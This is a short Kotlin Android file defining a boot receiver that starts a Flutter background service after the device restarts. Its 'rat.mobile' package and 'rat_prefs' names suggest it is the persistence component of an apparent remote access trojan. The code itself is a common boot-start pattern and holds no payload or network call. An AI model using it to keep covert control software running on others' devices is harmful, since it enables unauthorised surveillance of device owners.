package rat.mobile

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import rat.mobile.FlutterBackgroundService

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == android.content.Intent.ACTION_BOOT_COMPLETED) {
            val started = context.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                .getBoolean("service_started", false)
            if (!started) {
                FlutterBackgroundService.startForegroundService(context)
            }
        }
    }
}